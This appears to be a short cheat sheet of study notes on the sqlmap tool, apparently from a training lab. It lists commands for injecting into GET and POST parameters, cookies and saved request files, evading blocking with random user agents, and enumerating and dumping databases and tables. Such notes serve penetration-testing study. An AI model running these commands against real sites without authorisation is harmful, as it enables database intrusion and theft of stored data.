-----
# Running SQLMap on HTTP Request
-----
```bash
sqlmap -u $URL --batch 
--batch: skip users' inputs and use the default option
```

#### curl commands
- On the inspector, right click the request and "Copy as cURL"
- Paste it into sqlmap command
 ```bash
sqlmap $CURL_COMMAND
```

#### GET/POST Requests
```bash
# GET Request
sqlmap -u $URL
```
```
# POST Request
sqlmap $URL --data 'uid=1&name=test'

# If we know uid is a clear indicator of the vulnerability, we can use *
sqlmap $URL --data 'uid=1*&name=test'
```

#### Full HTTP Requests
- When the request becomes complex, we can use BurpSuite to export the request and use sqlmap with the saved request file.
```bash
sqlmap -r request.txt

# we can also add * to the fields in the request file wher ewe think is vulnerable to the injection
```

#### Custom SQLMap Requests

```shell-session
# --cookie option
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
NOTE: when there is no parameter (http://134.209.176.83:30960/case3.php), we can use -p Cookie to verify the 

# -H/--header option
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# --random-agent
Randomize the agent used. A lot of defensive applications will block requests from the same agent. Hence, changing the agent is needed.

# --mobile
sqlmap can inmiate mobile behavior with this flag

# --method
specify sqlmap to use other method rather than GET & POST
```

-----
# ENUMERATION
-----
- Basic
```bash
sqlmap -u $URL --banner --current-user --current-db --is-dba
```
- Table Enumeration
```bash
sqlmap -u $URL --tables -D $DATABASE
```
- Table//Row Enumeration
```bash
sqlmap -u $URL --dump -T $TABLE -D $DATABASE -C column1, column2,column3
```
- Database schema Enumeration
```bash
sqlmap -u $URL --schema
```
- Conditional Enumeration
```bash
sqlmap -u $URL --dump -T $TABLE -D $DATABASE --where="name LIKE 'f%'"
```